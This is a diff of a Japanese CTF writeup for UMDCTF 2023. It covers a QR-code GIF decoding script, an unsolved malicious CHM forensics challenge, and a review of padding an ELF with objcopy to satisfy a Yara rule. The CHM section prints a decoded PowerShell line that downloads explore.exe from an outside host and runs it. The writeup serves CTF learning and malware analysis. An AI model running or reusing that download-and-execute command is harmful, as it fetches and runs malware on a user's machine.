@@ -1,11 +1,11 @@
 ---
 title: "UMDCTF 2023 Writeup"
 date: 2023-05-04T14:00:00+09:00
-lastmod: 2023-05-04T14:00:00+09:00
+lastmod: 2023-05-29T16:00:00+09:00
 draft: false
 keywords: []
 description: ""
-tags: ["CTF"]
+tags: ["CTF", "Reviewed"]
 categories: ["CTF"]
 author: ""
 ---
@@ -14,6 +14,8 @@ author: ""
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 {{% /right %}}
+
+(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。)
 
 URL: [https://umdctf.io/challenges](https://umdctf.io/challenges)
 <br /><br />
@@ -226,6 +228,164 @@ Content-Length: 49
 <br />
 
 Flag: `UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}`
+
+
+
+
+<br /><br />
+<br /><br />
+## [Forensics]: Telekinetic Warfare (442 points)
+- - -
+### Challenge
+> Someone was able to exfil a top secret document from our airgapped network! How???
+
+Attachment:
+
+- bruh.gif
+
+<br />
+### Solution
+
+QRコードが含まれるアニメーションGIFです。
+
+試しに最初のQRコードを読み取ってみると、Base64でエンコードした文字列が得られました。
+
+10000以上のQRコードが含まれていますが、それらを読み取って一つにまとめてファイルに落とすだけなので、やることは明確です。
+
+<br />
+
+このチャレンジは、Mac PC上で解きました。
+
+下準備。
+
+<pre>
+$ pip install pyzbar
+$ brew install zbar
+$ pip install Pillow
+</pre>
+
+<br />
+
+書いたコード：
+
+```Python
+#!/usr/bin/env python3
+#-*- coding:utf-8 -*-
+import base64
+from PIL import Image, ImageSequence
+from pyzbar.pyzbar import decode
+
+IMAGE_PATH = 'bruh.gif'
+
+def get_frames(path):
+    im = Image.open(path)
+    return (frame.copy() for frame in ImageSequence.Iterator(im))
+
+outfile = open("brush.pdf", "wb")
+frames = get_frames(IMAGE_PATH)
+for i, f in enumerate(frames):
+    for x in decode(f):
+        data = x[0].decode("utf-8")
+        outfile.write(base64.b64decode(data))
+        # print(base64.b64decode(data))
+outfile.close()
+```
+
+<br />
+
+Flag: `UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}`
+
+
+<br /><br />
+<br /><br />
+## [Forensics]: Malware Chall Disclaimer (0 point)
+- - -
+### Challenge
+> The challenge "Doctors Hate Him" is designed to emulate an actual piece of malware so handle the file with caution. The sample was written by us however it should still be treated as malicious.
+<br /><br />
+Flag: UMDCTF{i_understand_that_malware_chall_is_sus}
+
+<br />
+### Solution
+
+"Doctors Hate Him" のチャレンジは、実際のマルウェアの一部を模倣して作成したものなので、注意を払って扱ってください、みたいなことだそうです。
+
+<br />
+
+Flag: `UMDCTF{i_understand_that_malware_chall_is_sus}`
+
+
+<br /><br />
+<br /><br />
+## [Forensics]: Doctors hate him!! (482 points)
+- - -
+### Challenge
+> Someone sent me this in an email... ad targeting is hitting a little too close here smh...
+
+Attachment:
+
+- Doctors-Hate-Him.zip
+
+<br />
+### (Unsolved)
+
+イベント中に解けなかったチャレンジですが、途中まではできたので、記録に残しておきます。
+
+Zipファイルには、.chmファイルが入っています。
+
+<br />
+
+実はたまたま最近、.chmファイルタイプのマルウェアを調べる機会があったんですよね。
+
+参考にしたUnit42のブログ：
+
+https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/
+
+<br />
+
+.chmファイルは、`7z x`で解凍が可能です。
+
+<br />
+
+解凍して出てくる test.html の中に、Base64でエンコードされている文字列があります。デコードすると、以下になります。
+
+`I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. .-.U.r.i. .h.t.t.p.:././.d.n.s.-.s.e.r.v.e.r...o.n.l.i.n.e.:.6.9.6.9./.e.x.p.l.o.r.e...e.x.e. .-.O.u.t.F.i.l.e. .e.x.p.l.o.r.e...e.x.e.;. .S.t.a.r.t.-.P.r.o.c.e.s.s. .e.x.p.l.o.r.e...e.x.e.;. .=.'.g.u.r.l._.j.n.a.g._.g.u.r.v.e.'.`
+
+<br />
+
+余計な `.` を取り除いて見やすくすると、以下になります。フラグの一部っぽい文字列 `gurl_jnag_gurve` も見つかります。
+
+<pre>
+Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'.
+</pre>
+
+<br />
+
+また、test.html には、コメントが含まれていて、フラグの一部 `UMDCTF{1997_called_` が見つかります。
+
+<br />
+
+`explore.exe`は、実際にダウンロードすることができて、Hash値は `63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51` です。
+
+<br />
+
+VirusTotalのScoreでは、多くのセキュリティベンダーがマルウェア判定しています。
+
+https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51
+
+<br />
+
+ここでPEファイルが入手できたので、静的解析やら動的解析やらをして、フラグの最後のピースを探そうとした人が多かったんじゃないかと思います。
+
+わたしもその内の一人で、ここで詰みました。。
+
+他の方のWriteupを参照すると、http://dns-server.online:6969/ に `present.txt` というファイルがあり、そこから最後のフラグが取れたようですね。
+
+<br />
+
+まぁ、そういうチャレンジもありなのかと思いますが、どうせなら`present.txt`に繋がる情報を`explore.exe`の中に埋め込んでおいて貰えたらもっと親切だったのに、とは思いました。
+
+
 
 
 
@@ -562,156 +722,65 @@ Flag: `UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}`
 
 <br /><br />
 <br /><br />
-## [Forensics]: Telekinetic Warfare (442 points)
-- - -
-### Challenge
-> Someone was able to exfil a top secret document from our airgapped network! How???
-
-Attachment:
-
-- bruh.gif
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
+<br />
+ここから下はイベント終了後に行った復習です。
 
 <br />
-### Solution
+elfファイルのセクション数を増やすのは、`objcopy` というコマンドが使えたようです。
 
-QRコードが含まれるアニメーションGIFです。
+確かにググったら出てきますね。どうしてイベント中に見つからなかったんだろう。
 
-試しに最初のQRコードを読み取ってみると、Base64でエンコードした文字列が得られました。
+<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_objcopy.png" alt="umdctf_2023_objcopy.png"> <br />
 
-10000以上のQRコードが含まれていますが、それらを読み取って一つにまとめてファイルに落とすだけなので、やることは明確です。
 
 <br />
 
-このチャレンジは、Mac PC上で解きました。
+ということで、とりあえずC言語でコード（前述）を書いてelfファイルを作った後に、`objcopy`を使うのが手っ取り早い方法だったみたいです。
 
-下準備。
+
 
 <pre>
-$ pip install pyzbar
-$ brew install zbar
-$ pip install Pillow
+$ objcopy --add-section poophaha=/dev/null YARA_solve.o
 </pre>
 
-<br />
-
-書いたコード：
-
-```Python
-#!/usr/bin/env python3
-#-*- coding:utf-8 -*-
-import base64
-from PIL import Image, ImageSequence
-from pyzbar.pyzbar import decode
-
-IMAGE_PATH = 'bruh.gif'
-
-def get_frames(path):
-    im = Image.open(path)
-    return (frame.copy() for frame in ImageSequence.Iterator(im))
-
-outfile = open("brush.pdf", "wb")
-frames = get_frames(IMAGE_PATH)
-for i, f in enumerate(frames):
-    for x in decode(f):
-        data = x[0].decode("utf-8")
-        outfile.write(base64.b64decode(data))
-        # print(base64.b64decode(data))
-outfile.close()
-```
 
 <br />
 
-Flag: `UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}`
-
-
-<br /><br />
-<br /><br />
-## [Forensics]: Malware Chall Disclaimer (0 point)
-- - -
-### Challenge
-> The challenge "Doctors Hate Him" is designed to emulate an actual piece of malware so handle the file with caution. The sample was written by us however it should still be treated as malicious.
-<br /><br />
-Flag: UMDCTF{i_understand_that_malware_chall_is_sus}
-
-<br />
-### Solution
-
-"Doctors Hate Him" のチャレンジは、実際のマルウェアの一部を模倣して作成したものなので、注意を払って扱ってください、みたいなことだそうです。
+エントロピーを上げる方法は、規則性の無いランダムデータ（圧縮データ、暗号化データ）が埋め込まれていればいいので、自分がやったように .jpg や .mpg を含める方法でもよかったのですが、`/dev/urandom` を使うのが正攻法（？）だったようです。
 
 <br />
 
-Flag: `UMDCTF{i_understand_that_malware_chall_is_sus}`
-
-
-<br /><br />
-<br /><br />
-## [Forensics]: Doctors hate him!! (482 points)
-- - -
-### Challenge
-> Someone sent me this in an email... ad targeting is hitting a little too close here smh...
-
-Attachment:
-
-- Doctors-Hate-Him.zip
-
-<br />
-### (Unsolved)
-
-イベント中に解けなかったチャレンジですが、途中まではできたので、記録に残しておきます。
-
-Zipファイルには、.chmファイルが入っています。
-
-<br />
-
-実はたまたま最近、.chmファイルタイプのマルウェアを調べる機会があったんですよね。
-
-参考にしたUnit42のブログ：
-
-https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/
-
-<br />
-
-.chmファイルは、`7z x`で解凍が可能です。
-
-<br />
-
-解凍して出てくる test.html の中に、Base64でエンコードされている文字列があります。デコードすると、以下になります。
-
-`I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. .-.U.r.i. .h.t.t.p.:././.d.n.s.-.s.e.r.v.e.r...o.n.l.i.n.e.:.6.9.6.9./.e.x.p.l.o.r.e...e.x.e. .-.O.u.t.F.i.l.e. .e.x.p.l.o.r.e...e.x.e.;. .S.t.a.r.t.-.P.r.o.c.e.s.s. .e.x.p.l.o.r.e...e.x.e.;. .=.'.g.u.r.l._.j.n.a.g._.g.u.r.v.e.'.`
-
-<br />
-
-余計な `.` を取り除いて見やすくすると、以下になります。フラグの一部っぽい文字列 `gurl_jnag_gurve` も見つかります。
+このランダムデータは、`objcopy` を使って追加するセクション部分に入れてもいいですし、yara ruleの中で位置のチェックはしていないのでファイルの末尾にappendしても行けますね。
 
 <pre>
-Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'.
+$ head -c 1500000 /dev/urandom >> YARA_solve.o
 </pre>
 
-<br />
-
-また、test.html には、コメントが含まれていて、フラグの一部 `UMDCTF{1997_called_` が見つかります。
 
 <br />
 
-`explore.exe`は、実際にダウンロードすることができて、Hash値は `63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51` です。
+手持ちのファイルを使うんだったら、こんな感じ。
+
+<pre>
+$ cat snow_slide.mp4 >> YARA_solve.o
+</pre>
+
+あるいは、
+
+<pre>
+$ objcopy --add-section aaa=snow_slide.mp4 YARA_solve.o
+</pre>
+
+
 
 <br />
 
-VirusTotalのScoreでは、多くのセキュリティベンダーがマルウェア判定しています。
+挿入位置に関しては、文字列についても同様で、コードに含めなくても末尾に付ける方法もアリです。
 
-https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51
-
-<br />
-
-ここでPEファイルが入手できたので、静的解析やら動的解析やらをして、フラグの最後のピースを探そうとした人が多かったんじゃないかと思います。
-
-わたしもその内の一人で、ここで詰みました。。
-
-他の方のWriteupを参照すると、http://dns-server.online:6969/ に `present.txt` というファイルがあり、そこから最後のフラグが取れたようですね。
-
-<br />
-
-まぁ、そういうチャレンジもありなのかと思いますが、どうせなら`present.txt`に繋がる情報を`explore.exe`の中に埋め込んでおいて貰えたらもっと親切だったのに、とは思いました。
+<pre>
+$ echo "jessie" >> YARA_solve.o
+</pre>
 
 
 
